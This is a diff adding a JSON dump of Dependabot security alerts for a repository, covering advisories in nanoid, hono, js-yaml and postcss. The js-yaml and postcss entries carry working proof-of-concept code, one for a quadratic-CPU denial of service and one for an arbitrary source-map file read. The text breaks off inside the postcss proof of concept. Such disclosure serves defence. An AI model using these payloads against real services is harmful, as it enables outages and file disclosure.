@@ -1,0 +1,3463 @@
+[
+  {
+    "number": 28,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "nanoid"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-2v37-7h3g-55p8",
+      "cve_id": "CVE-2026-67213",
+      "summary": "nanoid: custom generators can loop indefinitely when size is zero",
+      "description": "nanoid (Nano ID) before 5.1.6 contains an infinite loop in the customAlphabet and customRandom functions. When these functions are configured with a size of 0, the internal generation loop never satisfies its exit condition and spins indefinitely, hanging the calling thread. An application that passes an unvalidated, attacker-controlled size of 0 to these functions is exposed to a denial-of-service condition.",
+      "severity": "high",
+      "identifiers": [
+        {
+          "value": "GHSA-2v37-7h3g-55p8",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-67213",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-67213"
+        },
+        {
+          "url": "https://github.com/ai/nanoid/commit/cb3626d0f3342fdf179cd425fd9c4fbb92c7d0e7"
+        },
+        {
+          "url": "https://github.com/ai/nanoid/releases/tag/5.1.6"
+        },
+        {
+          "url": "https://www.vulncheck.com/advisories/nanoid-before-infinite-loop-via-zero-size-in-customalphabet-and-customrandom"
+        },
+        {
+          "url": "https://github.com/ai/nanoid/commit/f9d13f150847d117877adee3460a46eceb0cf49b"
+        },
+        {
+          "url": "https://github.com/ai/nanoid/releases/tag/3.3.17"
+        },
+        {
+          "url": "https://github.com/ai/nanoid/commit/e10f8d40ce9d1ab47f66d65a16b48086432730d0"
+        },
+        {
+          "url": "https://github.com/ai/nanoid/releases/tag/3.3.18"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-2v37-7h3g-55p8"
+        }
+      ],
+      "published_at": "2026-07-29T15:31:12Z",
+      "updated_at": "2026-08-13T15:43:02Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "nanoid"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.0.0, < 5.1.6",
+          "first_patched_version": {
+            "identifier": "5.1.6"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "nanoid"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "< 3.3.18",
+          "first_patched_version": {
+            "identifier": "3.3.18"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 5.9
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.2
+        }
+      },
+      "epss": {
+        "percentage": 0.00319,
+        "percentile": 0.24516
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 5.9
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-835",
+          "name": "Loop with Unreachable Exit Condition ('Infinite Loop')"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "nanoid"
+      },
+      "severity": "high",
+      "vulnerable_version_range": "< 3.3.18",
+      "first_patched_version": {
+        "identifier": "3.3.18"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/28",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/28",
+    "created_at": "2026-08-21T01:04:43Z",
+    "updated_at": "2026-08-21T01:04:43Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 27,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "hono"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "development",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-f23p-vx2j-j53r",
+      "cve_id": "CVE-2026-71850",
+      "summary": "Hono: `memo()` retains SSR output across requests, leading to cross-user data disclosure",
+      "description": "### Summary\n\n`memo()` from `hono/jsx` retains the result of a server-side render and reuses it for later renders with comparator-equal props. Request-scoped values read inside the component take no part in that comparison, so a response can contain HTML rendered for another user's request.\n\n### Details\n\nComponents wrapped with `memo()` are compared by props alone. Values read implicitly during rendering do not participate: JSX Context through `createContext()` and `useContext()`, `useRequestContext()` from `hono/jsx-renderer`, and `getContext()` from `hono/context-storage`. The retained result lives as long as the wrapped component, so it outlives the request that produced it.\n\nPer-request context isolation is not what fails: the current request's values are established correctly, but the memoized component is skipped before anything reads them.\n\nThis issue arises when a component wrapped in `memo()` obtains user- or request-specific data from an ambient context instead of through props.\n\n### Impact\n\nA user may receive a response containing HTML rendered for another user, when both render the same memoized component with comparator-equal props on the same warm instance.\n\nThis may lead to:\n\n- Disclosure of another user's account or profile data\n- Disclosure of request-scoped secrets embedded in HTML, such as CSRF tokens\n- Exposure of role-specific content to users who should not receive it\n\nExploitation depends on the order in which renders populate the retained value and on both requests reaching the same warm instance.\n\nThis issue affects applications that render with `hono/jsx` on the server and wrap a component reading ambient request state in `memo()`. Applications that pass all request-specific values through props, or that do not use `memo()`, are unaffected. Client-side rendering is unaffected.",
+      "severity": "medium",
+      "identifiers": [
+        {
+          "value": "GHSA-f23p-vx2j-j53r",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-71850",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/honojs/hono/security/advisories/GHSA-f23p-vx2j-j53r"
+        },
+        {
+          "url": "https://github.com/honojs/hono/commit/0c45036d6b0ddf42ab2fa44639dc8710825d5c0f"
+        },
+        {
+          "url": "https://github.com/honojs/hono/releases/tag/v4.12.34"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-f23p-vx2j-j53r"
+        }
+      ],
+      "published_at": "2026-08-07T18:42:01Z",
+      "updated_at": "2026-08-07T18:42:04Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "hono"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": ">= 3.8.0, < 4.12.34",
+          "first_patched_version": {
+            "identifier": "4.12.34"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N",
+          "score": 4.8
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00164,
+        "percentile": 0.06037
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N",
+        "score": 4.8
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-488",
+          "name": "Exposure of Data Element to Wrong Session"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "hono"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": ">= 3.8.0, < 4.12.34",
+      "first_patched_version": {
+        "identifier": "4.12.34"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/27",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/27",
+    "created_at": "2026-08-21T01:04:43Z",
+    "updated_at": "2026-08-21T01:04:43Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 26,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "hono"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "development",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-79qm-7rj5-m7r9",
+      "cve_id": "CVE-2026-71849",
+      "summary": "Hono: Proxy Helper does not remove response headers listed in the `Connection` header",
+      "description": "### Summary\n\nThe Proxy Helper (`hono/proxy`) does not remove response headers named by the origin's `Connection` header. Headers that the origin marked as connection-scoped are therefore forwarded to clients.\n\n### Details\n\nPer RFC 9110 Section 7.6.1, an intermediary must remove the header fields listed in a message's `Connection` header field before forwarding the message, in addition to the well-known hop-by-hop headers. The `proxy()` function removed the well-known hop-by-hop headers (including `Connection` itself) from origin responses, but did not remove the headers that the response's `Connection` header field designated as connection-scoped.\n\nThis issue arises when an application proxies responses from an origin that declares additional, non-standard headers as hop-by-hop via the `Connection` response header.\n\n### Impact\n\nA client may receive response headers that the origin intended only for its immediate peer. This may lead to:\n\n- Disclosure of connection-scoped or internal metadata contained in such headers\n\nThis issue affects applications that use the Proxy Helper (`hono/proxy`) to forward responses from origins that list custom header names in their `Connection` response header. Applications whose origins only use the standard hop-by-hop headers are not affected.",
+      "severity": "low",
+      "identifiers": [
+        {
+          "value": "GHSA-79qm-7rj5-m7r9",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-71849",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/honojs/hono/security/advisories/GHSA-79qm-7rj5-m7r9"
+        },
+        {
+          "url": "https://github.com/honojs/hono/commit/720b566290793d4358bf39843adcb7cf4da4548f"
+        },
+        {
+          "url": "https://github.com/honojs/hono/releases/tag/v4.12.34"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-79qm-7rj5-m7r9"
+        }
+      ],
+      "published_at": "2026-08-07T18:38:48Z",
+      "updated_at": "2026-08-07T18:38:49Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "hono"
+          },
+          "severity": "low",
+          "vulnerable_version_range": ">= 4.7.0, < 4.12.34",
+          "first_patched_version": {
+            "identifier": "4.12.34"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+          "score": 3.7
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00236,
+        "percentile": 0.14531
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "score": 3.7
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-200",
+          "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "hono"
+      },
+      "severity": "low",
+      "vulnerable_version_range": ">= 4.7.0, < 4.12.34",
+      "first_patched_version": {
+        "identifier": "4.12.34"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/26",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/26",
+    "created_at": "2026-08-21T01:04:43Z",
+    "updated_at": "2026-08-21T01:04:43Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 25,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "hono"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "development",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-54fx-42gc-7vw4",
+      "cve_id": "CVE-2026-71848",
+      "summary": "Hono: Algorithmic Complexity DoS in Language Middleware",
+      "description": "### Summary\n\nThe `languageDetector` middleware is vulnerable to algorithmic complexity denial of service when processing a crafted language tag containing a large number of hyphen-separated subtags.\n\n### Details\n\nTo implement progressive language-tag truncation, `normalizeLanguage()` repeatedly calls `parts.slice(0, i).join('-')` for every possible prefix. The total amount of string processing grows quadratically with the number of subtags.\n\nLanguage values may come from a query parameter, cookie, `Accept-Language` header, or URL path, depending on the detector configuration. The default detector order enables query-string, cookie, and header detection, so applications using `languageDetector()` may expose this processing to unauthenticated requests.\n\nRequest-size limits reduce the maximum cost of a single request but do not eliminate the issue. Inputs accepted by common JavaScript runtimes can still cause noticeable synchronous event-loop blocking.\n\n### Impact\n\nAn attacker may repeatedly send requests containing long, hyphen-separated language tags, causing excessive CPU consumption and preventing unrelated requests from being processed.\n\nThe practical impact depends on the runtime's request-size limits, reverse-proxy configuration, and the detectors enabled by the application.\n\n### Resolution\n\nThe progressive lookup should avoid reconstructing every shorter prefix. The implementation can instead inspect the configured supported languages and select the longest value that matches the input at a hyphen boundary.",
+      "severity": "medium",
+      "identifiers": [
+        {
+          "value": "GHSA-54fx-42gc-7vw4",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-71848",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/honojs/hono/security/advisories/GHSA-54fx-42gc-7vw4"
+        },
+        {
+          "url": "https://github.com/honojs/hono/commit/f70e2c31684387b3231cc38512a31df6ca76a1c7"
+        },
+        {
+          "url": "https://github.com/honojs/hono/releases/tag/v4.12.34"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-54fx-42gc-7vw4"
+        }
+      ],
+      "published_at": "2026-08-07T18:36:31Z",
+      "updated_at": "2026-08-07T18:36:33Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "hono"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": ">= 4.12.0, < 4.12.34",
+          "first_patched_version": {
+            "identifier": "4.12.34"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "score": 5.3
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00291,
+        "percentile": 0.21502
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "score": 5.3
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-407",
+          "name": "Inefficient Algorithmic Complexity"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "hono"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": ">= 4.12.0, < 4.12.34",
+      "first_patched_version": {
+        "identifier": "4.12.34"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/25",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/25",
+    "created_at": "2026-08-21T01:04:43Z",
+    "updated_at": "2026-08-21T01:04:43Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 24,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "js-yaml"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "development",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-5p4m-2wfm-xmqj",
+      "cve_id": null,
+      "summary": "JS-YAML: Quadratic CPU consumption in !!omap resolution (3.x and 4.x) — CVE-2026-59870 fix not backported",
+      "description": "# Quadratic CPU consumption in `!!omap` resolution (js-yaml 3.x and 4.x)\n\n## Summary\n\n`resolveYamlOmap()` enforces key uniqueness for `!!omap` sequences with a linear\nscan (`objectKeys.indexOf(...)`) inside the per-element loop, making resolution\n**O(n²)** in the number of entries. A modestly sized YAML document therefore\nconsumes disproportionate CPU inside `yaml.load()`, giving a denial of service\nagainst any consumer that parses untrusted YAML.\n\n`!!omap` is registered in the **default schema**\n(`lib/schema/default.js` → `require('../type/omap')`), so a plain\n`yaml.load(untrustedInput)` with no options is affected — no custom schema or\nnon-default configuration is required.\n\n**This is the same weakness as CVE-2026-59870 / GHSA-724g-mxrg-4qvm**, which was\nfixed in the 5.x line in 5.2.1. That fix was never backported: both currently\nmaintained legacy lines still carry the original implementation.\n\n## Affected versions\n\n| Line | Latest tested | Status |\n|---|---|---|\n| 3.x | **3.15.0** | Affected — `objectKeys.indexOf(pairKey)` at `lib/type/omap.js:29` |\n| 4.x | **4.3.0** | Affected — `objectKeys.indexOf(pairKey)` at `lib/type/omap.js:30` |\n| 5.x | 5.2.2 | **Not affected** — fixed in 5.2.1 (uses a `Set`) |\n\nBoth figures are the newest release of each line at the time of writing, so\nthis is not a \"you are on an old version\" issue.\n\n## Details\n\n`lib/type/omap.js` (js-yaml 4.3.0):\n\n```js\nif (objectKeys.indexOf(pairKey) === -1) objectKeys.push(pairKey)\nelse return false\n```\n\n`objectKeys` grows by one element per entry, and `Array.prototype.indexOf` is a\nlinear scan, so resolving an `n`-entry `!!omap` performs roughly\n`1 + 2 + … + n` comparisons — quadratic in `n`. The work happens synchronously\ninside `yaml.load()`, blocking the event loop for its whole duration.\n\nThe 5.x line already solves exactly this by tracking seen keys in a `Set`\n(`src/tag/sequence/omap.ts`):\n\n```ts\nif (carrier.seen.has(key)) return 'duplicate key in ordered map'\ncarrier.seen.add(key)\n```\n\n## Proof of concept\n\n```js\n// poc.js  —  node poc.js\nconst yaml = require('js-yaml');\nconst doc = n => '!!omap\\n' + Array.from({length: n}, (_, i) => `- k${i}: ${i}`).join('\\n') + '\\n';\n\nfor (const n of [10000, 20000, 40000, 80000]) {\n  const d = doc(n), t = Date.now();\n  yaml.load(d);                      // default schema, no options\n  console.log(`n=${n} bytes=${d.length} load=${Date.now() - t}ms`);\n}\n```\n\n### Measured (node v20.20.2, default heap, no flags)\n\n**js-yaml 4.3.0**\n\n```\nn=10000  bytes=137787   load=54ms\nn=20000  bytes=297787   load=169ms\nn=40000  bytes=617787   load=646ms\nn=80000  bytes=1257787  load=2607ms\n```\n\n**js-yaml 3.15.0**\n\n```\nn=10000  bytes=137787   load=53ms\nn=20000  bytes=297787   load=166ms\nn=40000  bytes=617787   load=641ms\nn=80000  bytes=1257787  load=2567ms\n```\n\nRuntime grows by a factor of ~4 for each doubling of `n`, which is the\nsignature of O(n²) (linear growth would be ~2×).\n\nScaling further: a **2.48 MB** document with 150,000 entries blocked\n`yaml.load()` for **10.8 seconds**.\n\n## Impact\n\nAny service that parses attacker-influenced YAML with js-yaml 3.x or 4.x can be\nstalled with a small input. Because the loop is synchronous, a single request\nblocks the Node.js event loop and stalls every other request in the process —\nso the amplification is per-process, not just per-request.\n\nSuggested severity: consistent with **CVE-2026-59870** (the same weakness in\n5.x), i.e. Availability-only impact, network attack vector, no privileges or\nuser interaction required.\n\n## Suggested fix\n\nMirror the 5.x fix — replace the linear scan with a `Set`:\n\n```js\n// lib/type/omap.js\nconst seen = new Set()\n// ...\nif (seen.has(pairKey)) return false\nseen.add(pairKey)\n```\n\nThis preserves the existing duplicate-key rejection semantics exactly while\nmaking resolution O(n). A `maxOmapLength`-style cap would also work, but the\n`Set` matches what 5.x already ships and requires no new option.\n\n## References\n\n- CVE-2026-59870 / GHSA-724g-mxrg-4qvm — same weakness in 5.0.0–5.2.0, fixed in 5.2.1\n- `lib/type/omap.js` (3.x, 4.x) — the affected resolver\n- `lib/schema/default.js` — registers `!!omap` in the default schema\n\n## Discovery\n\nFound by an automated static-analysis and executed-proof-of-concept scanner run\nagainst js-yaml 4.2.0, then manually verified against 3.15.0 and 4.3.0 by\nexecuting the proof of concept above. All timings in this report were measured\non the **current** releases of each line, not on the version originally scanned.",
+      "severity": "high",
+      "identifiers": [
+        {
+          "value": "GHSA-5p4m-2wfm-xmqj",
+          "type": "GHSA"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-5p4m-2wfm-xmqj"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-5p4m-2wfm-xmqj"
+        }
+      ],
+      "published_at": "2026-08-06T20:27:32Z",
+      "updated_at": "2026-08-06T20:27:32Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "js-yaml"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.0.0, < 4.3.1",
+          "first_patched_version": {
+            "identifier": "4.3.1"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "js-yaml"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.0.0, < 3.15.1",
+          "first_patched_version": {
+            "identifier": "3.15.1"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-407",
+          "name": "Inefficient Algorithmic Complexity"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "js-yaml"
+      },
+      "severity": "high",
+      "vulnerable_version_range": ">= 4.0.0, < 4.3.1",
+      "first_patched_version": {
+        "identifier": "4.3.1"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/24",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/24",
+    "created_at": "2026-08-21T01:04:43Z",
+    "updated_at": "2026-08-21T01:04:43Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 23,
+    "state": "auto_dismissed",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "hono"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "development",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-8j4g-w8fx-2239",
+      "cve_id": "CVE-2026-69207",
+      "summary": "Hono: ReDoS in CORS middleware via Access-Control-Request-Headers",
+      "description": "### Summary\n\nThe built-in CORS middleware (`hono/cors`) parses the attacker-controlled `Access-Control-Request-Headers` request header during a preflight (`OPTIONS`) request using a regular expression whose running time is quadratic in the input length. A single request carrying a long run of whitespace can consume seconds of CPU, and repeated requests can render the service unresponsive. This parsing runs under the default configuration.\n\n### Details\n\nOn a CORS preflight, when `allowHeaders` is not configured - the default - the middleware reflects and parses the `Access-Control-Request-Headers` value. The parser used a whitespace-tolerant regular expression whose backtracking makes the work grow quadratically (O(n²)) with the length of the value when it contains a long whitespace sequence without a delimiter.\n\nBecause the header value is bounded only by the deployment's maximum HTTP header size, a single preflight can block request processing for a noticeable amount of time; on runtimes that share one execution thread across requests, this stalls concurrent requests as well. No authentication, special origin, or user interaction is required.\n\nThis issue arises for any application using `cors()` with the default (or an empty) `allowHeaders`. Applications that set a non-empty `allowHeaders` do not reach the affected path.\n\n### Impact\n\nAn unauthenticated attacker can send preflight requests that each consume disproportionate CPU relative to their size, degrading or denying service. This is a denial-of-service issue only; it does not expose or modify data.",
+      "severity": "medium",
+      "identifiers": [
+        {
+          "value": "GHSA-8j4g-w8fx-2239",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-69207",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/honojs/hono/security/advisories/GHSA-8j4g-w8fx-2239"
+        },
+        {
+          "url": "https://github.com/honojs/hono/commit/93fc250d8b4df58ea542cb945171de8013d5e6d5"
+        },
+        {
+          "url": "https://github.com/honojs/hono/releases/tag/v4.12.34"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-8j4g-w8fx-2239"
+        }
+      ],
+      "published_at": "2026-08-03T20:23:30Z",
+      "updated_at": "2026-08-03T20:23:59Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "hono"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": "< 4.12.34",
+          "first_patched_version": {
+            "identifier": "4.12.34"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "score": 5.3
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00653,
+        "percentile": 0.48523
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "score": 5.3
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "hono"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": "< 4.12.34",
+      "first_patched_version": {
+        "identifier": "4.12.34"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/23",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/23",
+    "created_at": "2026-08-21T01:04:42Z",
+    "updated_at": "2026-08-21T01:04:43Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": "2026-08-21T01:04:43Z"
+  },
+  {
+    "number": 22,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "postcss"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-fxqj-rqcc-2cmp",
+      "cve_id": "CVE-2026-69153",
+      "summary": "PostCSS: incomplete fix of GHSA-6g55-p6wh-862q — attacker-controlled sourceMappingURL reads arbitrary .map files when `from` is unset",
+      "description": "## Summary\n\nThe fix for GHSA-6g55-p6wh-862q added a guard in `lib/previous-map.js` `PreviousMap.loadFile()` that restricts an attacker-controlled `sourceMappingURL` (from a CSS comment) to a `.map` extension and, for untrusted maps, rejects `..` traversal and absolute paths. The traversal/absolute rejection is nested inside `if (cssFile) { ... }`. When PostCSS is invoked without the `from` option, `cssFile` is falsy and that branch is skipped, leaving only the `.map` extension check.\n\n`PreviousMap` is constructed by `lib/input.js` whenever `pathAvailable && sourceMapAvailable` (under Node with source-map available), independent of `opts.from`/`opts.map` (the constructor returns early only for `opts.map === false`). So `postcss([]).process(css)` on attacker CSS reaches `loadFile` with `cssFile` undefined, and an attacker `/*# sourceMappingURL=/abs/path/x.map */` (or `../`-traversing path) is read via `readFileSync`. When the file is valid JSON, its `sources` (filesystem paths) and `sourcesContent` (source contents) are disclosed in the generated source map.\n\n## Affected code (v8.5.22 — the release carrying the GHSA-6g55 fix)\n\n```js\n// lib/previous-map.js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n    if (cssFile) {                       // guard runs ONLY when `from` is set\n      let relativePath = relative(dirname(cssFile), path)\n      if (relativePath === '..' ||\n          relativePath.startsWith('..' + sep) ||\n          isAbsolute(relativePath)) {\n        return undefined\n      }\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()   // sink\n  }\n}\n\n// loadMap(): untrusted annotation path, trusted=false; file === opts.from\n} else if (this.annotation) {\n  let map = this.annotation\n  if (file) map = join(dirname(file), map)   // no `from` -> map stays the raw URL\n  let unknown = this.loadFile(map, file, false)  // file undefined -> cssFile falsy\n```\n\n## Proof of concept (verified on postcss 8.5.22)\n\n```js\nconst postcss = require('postcss')\nconst fs = require('fs')\n\n// a 'secret' sourcemap OUTSIDE any expected tree (stand-in for another project's .map)\nconst secret = '/tmp/pcpoc/secret_out_of_tree.map'\nfs.writeFileSync(secret, JSON.stringify({\n  version: 3, sources: ['/etc/REAL_PATH_LEAK'], mappings: '', names: [],\n  sourcesContent: ['TOP_SECRET_abcdef']\n}))\n\nconst css = 'a{color:red}\\n/*# sourceMappingURL=' + secret + ' */'\nconst leaks = m => m && JSON.stringify(m.toJSON ? m.toJSON() : m).includes('TOP_SECRET_abcdef')\n\n;(async () => {\n  // A) NO `from`  -> guard skipped -> arbitrary absolute .map read + disclosed\n  const a = await postcss([]).process(css, { map: true })\n  console.log('no from   -> leaked:', !!leaks(a.map))   // true\n\n  // B) WITH `from` -> guard active -> blocked\n  const b = await postcss([]).process(css, { from: 